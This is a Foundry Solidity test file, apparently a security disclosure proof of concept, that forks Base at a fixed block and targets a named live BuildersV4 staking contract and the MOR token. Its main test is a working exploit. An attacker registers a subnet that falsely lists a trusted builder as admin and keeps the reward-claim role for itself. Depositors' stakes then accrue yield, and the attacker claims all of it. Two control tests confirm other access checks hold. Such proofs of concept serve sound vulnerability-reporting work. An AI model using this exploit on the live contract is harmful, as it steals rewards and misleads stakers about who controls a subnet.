// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20M {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

struct Subnet {
    string name;
    address admin;
    uint128 unused1;
    uint128 withdrawLockPeriodAfterDeposit;
    uint128 unused2;
    uint256 minimalDeposit;
    address claimAdmin;
}

struct SubnetMetadata {
    string slug;
    string description;
    string website;
    string image;
}

struct UserData {
    uint128 lastDeposit;
    uint128 unused1;
    uint256 deposited;
    uint256 unused2;
}

interface IBuildersV4G1 {
    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function editSubnetMetadata(bytes32 subnetId_, SubnetMetadata calldata metadata_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function claim(bytes32 subnetId_, address receiver_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function subnets(bytes32 subnetId_)
        external
        view
        returns (string memory, address, uint128, uint128, uint128, uint256, address);
    function usersData(address user_, bytes32 subnetId_) external view returns (UserData memory);
    function minimalWithdrawLockPeriod() external view returns (uint256);
    function getCurrentSubnetRewards(bytes32 subnetId_) external view returns (uint256);
}

/// @title BuildersV4 — spoofed subnet admin PoC (Base fork)
/// @notice Fork PoCs on Base block 56038769. Attacker = fresh unprivileged
///         address; no owner/admin/multisig prank anywhere — EXCEPT that the
///         spoof test deliberately NEVER pranks the spoofed admin, which is
///         the whole point (the admin never consents).
contract PocG1BuildersTest is Test {
    uint256 constant BASE_BLOCK = 56038769;
    address constant BUILDERS_V4 = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;

    uint256 constant DAY = 86400;
    uint256 constant MIN_LOCK = 604800; // 7 days, live minimalWithdrawLockPeriod

    address attacker;
    address legit;
    address victim1;
    address victim2;
    address victim3;

    function setUp() public {
        vm.createSelectFork("base", BASE_BLOCK);
        attacker = makeAddr("attacker");
        legit = makeAddr("legitBuilder");
        victim1 = makeAddr("victim1");
        victim2 = makeAddr("victim2");
        victim3 = makeAddr("victim3");
        vm.deal(attacker, 10 ether);
        vm.deal(legit, 10 ether);
        vm.deal(victim1, 10 ether);
        vm.deal(victim2, 10 ether);
        vm.deal(victim3, 10 ether);
        deal(MOR, attacker, 100_000 ether);
        deal(MOR, legit, 100_000 ether);
        deal(MOR, victim1, 100_000 ether);
        deal(MOR, victim2, 100_000 ether);
        deal(MOR, victim3, 100_000 ether);
    }

    function _mkSubnet(string memory name, address admin, address claimAdmin, uint256 lock)
        internal
        pure
        returns (Subnet memory)
    {
        return
            Subnet({
                name: name,
                admin: admin,
                unused1: 0,
                withdrawLockPeriodAfterDeposit: uint128(lock),
                unused2: 0,
                minimalDeposit: 1 ether,
                claimAdmin: claimAdmin
            });
    }

    function _mkMeta() internal pure returns (SubnetMetadata memory) {
        return SubnetMetadata({slug: "g1", description: "g1", website: "https://example.com", image: ""});
    }

    function _create(string memory name, address admin, address claimAdmin, uint256 lock, address caller)
        internal
        returns (bytes32 id)
    {
        id = IBuildersV4G1(BUILDERS_V4).getSubnetId(name);
        vm.prank(caller);
        IBuildersV4G1(BUILDERS_V4).createSubnet(_mkSubnet(name, admin, claimAdmin, lock), _mkMeta());
    }

    function _deposit(address who, bytes32 id, uint256 amount) internal {
        vm.prank(who);
        IERC20M(MOR).approve(BUILDERS_V4, amount);
        vm.prank(who);
        IBuildersV4G1(BUILDERS_V4).deposit(id, amount);
    }

    function _subnetAdmin(bytes32 id) internal view returns (address admin, address claimAdmin, uint128 lock) {
        (, admin, , lock, , , claimAdmin) = IBuildersV4G1(BUILDERS_V4).subnets(id);
    }

    // ------------------------------------------------------------------
    // Spoofed admin + attacker claimAdmin steals the subnet yield.
    // createSubnet() NEVER binds subnet.admin / claimAdmin to msg.sender
    // (BuildersV4.sol: createSubnet has no sender check; _validateSubnet
    // only checks non-zero + lock >= minimum). So the attacker creates a
    // subnet whose on-chain admin is a TRUSTED third party (never
    // consents, never signs) while keeping THEMSELVES as claimAdmin;
    // claim() lets claimAdmin send pendingRewards to ANY receiver. The
    // attacker holds NO privileged role at all — the admin is the victim
    // — and profits directly (steals yield); the only on-chain trust
    // signal (the admin field) is forged.
    // ------------------------------------------------------------------
    function test_G1_SpoofedAdminClaimAdminStealsYield() public {
        // The legit builder's own real subnet (admin == claimAdmin == legit).
        bytes32 realId = _create("RealBuilder", legit, legit, MIN_LOCK, legit);

        // The attacker spoofs a second subnet: same trusted admin on-chain,
        // but claimAdmin == attacker. The legit builder NEVER signs anything
        // (this test never pranks `legit` as a caller except creating their
        // own real subnet above).
        bytes32 spoofId = _create("RealBuilderPro", legit, attacker, MIN_LOCK, attacker);

        (address spoofAdmin, address spoofClaimAdmin, ) = _subnetAdmin(spoofId);
        assertEq(spoofAdmin, legit, "spoofed admin must read as the trusted builder");
        assertEq(spoofClaimAdmin, attacker, "claimAdmin is the attacker");
        (address realAdmin, address realClaimAdmin, ) = _subnetAdmin(realId);
        assertEq(realAdmin, legit);
        assertEq(realClaimAdmin, legit);
        // Two subnets, identical admin on-chain — indistinguishable by the
        // admin field alone.

        // Victims stake 100,000 MOR into the spoofed subnet.
        _deposit(victim1, spoofId, 50_000 ether);
        _deposit(victim2, spoofId, 30_000 ether);
        _deposit(victim3, spoofId, 20_000 ether);
        assertEq(IBuildersV4G1(BUILDERS_V4).usersData(victim1, spoofId).deposited, 50_000 ether);

        // 30 days of yield accrue to the spoofed subnet.
        vm.warp(block.timestamp + 30 days);
        uint256 pending = IBuildersV4G1(BUILDERS_V4).getCurrentSubnetRewards(spoofId);
        assertGt(pending, 1_000 ether, "spoofed subnet must have material pending rewards");

        // The attacker, as claimAdmin, drains ALL of it to themselves.
        uint256 attackerBefore = IERC20M(MOR).balanceOf(attacker);
        uint256 legitBefore = IERC20M(MOR).balanceOf(legit);
        vm.prank(attacker);
        IBuildersV4G1(BUILDERS_V4).claim(spoofId, attacker);
        uint256 stolen = IERC20M(MOR).balanceOf(attacker) - attackerBefore;

        // LOSS: the full pending yield, stolen (claim fee is 0 live).
        assertGe(stolen, (pending * 99) / 100, "attacker must receive ~all pending rewards");
        assertGt(stolen, 1_000 ether);
        // The trusted admin got nothing; depositors' principal is
        // untouched, but 100% of the MOR emissions their stake generated
        // — intended to fund the legitimate builder — went to the
        // attacker instead (principal theft stays impossible).
        assertEq(IERC20M(MOR).balanceOf(legit), legitBefore);
        assertEq(IBuildersV4G1(BUILDERS_V4).usersData(victim1, spoofId).deposited, 50_000 ether);
        assertEq(IBuildersV4G1(BUILDERS_V4).usersData(victim2, spoofId).deposited, 30_000 ether);
        assertEq(IBuildersV4G1(BUILDERS_V4).usersData(victim3, spoofId).deposited, 20_000 ether);
        // The spoofed admin field still reads as the trusted builder.
        (address adminAfter, , ) = _subnetAdmin(spoofId);
        assertEq(adminAfter, legit);

        emit log_named_uint("stolen MOR (wei)", stolen);
    }

    // ------------------------------------------------------------------
    // Negative control: non-admin cannot touch any subnet's config.
    // ------------------------------------------------------------------
    function test_NonAdminCannotTouchSubnet() public {
        bytes32 id = _create("G1VictimSubnet", legit, legit, MIN_LOCK, legit);

        // Attacker (not admin) cannot edit the subnet at all.
        vm.prank(attacker);
        vm.expectRevert("BU: not the Subnet owner");
        IBuildersV4G1(BUILDERS_V4).editSubnet(id, _mkSubnet("G1VictimSubnet", attacker, attacker, MIN_LOCK));

        // claimAdmin is NOT the admin: even the legit subnet's claimAdmin
        // cannot edit (here claimAdmin == legit, so use a dedicated case).
        bytes32 id2 = _create("G1ClaimAdminSubnet", legit, attacker, MIN_LOCK, legit);
        vm.prank(attacker); // attacker is claimAdmin here, not admin
        vm.expectRevert("BU: not the Subnet owner");
        IBuildersV4G1(BUILDERS_V4).editSubnet(id2, _mkSubnet("G1ClaimAdminSubnet", legit, attacker, MIN_LOCK));

        // Attacker cannot hijack an existing subnet by "transferring" its
        // admin to themselves — editSubnet is admin-gated first.
        vm.prank(attacker);
        vm.expectRevert("BU: not the Subnet owner");
        IBuildersV4G1(BUILDERS_V4).editSubnet(id, _mkSubnet("G1VictimSubnet", attacker, attacker, MIN_LOCK));

        // Exact-name squatting reverts (attacker must use a different name).
        vm.prank(attacker);
        vm.expectRevert("BU: the Subnet already exist (1)");
        IBuildersV4G1(BUILDERS_V4).createSubnet(_mkSubnet("G1VictimSubnet", attacker, attacker, MIN_LOCK), _mkMeta());

        // Zero admin is rejected at creation.
        vm.prank(attacker);
        vm.expectRevert("BU: invalid admin address");
        IBuildersV4G1(BUILDERS_V4).createSubnet(
            _mkSubnet("G1ZeroAdmin", address(0), attacker, MIN_LOCK), _mkMeta()
        );
    }

    // ------------------------------------------------------------------
    // Negative control: no shared lock state across subnets.
    // ------------------------------------------------------------------
    function test_CrossSubnetLockIndependent() public {
        bytes32 idA = _create("G1SubnetA", attacker, attacker, MIN_LOCK, attacker);
        bytes32 idB = _create("G1SubnetB", victim1, victim1, MIN_LOCK, victim1);
        _deposit(victim1, idB, 10_000 ether);
        _deposit(attacker, idA, 10_000 ether);

        // Admin of A raises A's lock to the max; B is untouched.
        vm.warp(block.timestamp + 1 days);
        vm.prank(attacker);
        IBuildersV4G1(BUILDERS_V4).editSubnet(idA, _mkSubnet("G1SubnetA", attacker, attacker, uint256(type(uint128).max) / 2));

        vm.warp(block.timestamp + 8 days);
        // Victim withdraws from B normally (past B's 7-day lock).
        vm.prank(victim1);
        IBuildersV4G1(BUILDERS_V4).withdraw(idB, 10_000 ether);
        assertEq(IERC20M(MOR).balanceOf(victim1), 100_000 ether);
        // Attacker's own A position is frozen by their own edit (control).
        vm.prank(attacker);
        vm.expectRevert("BU: user withdraw is locked");
        IBuildersV4G1(BUILDERS_V4).withdraw(idA, 10_000 ether);
    }
}
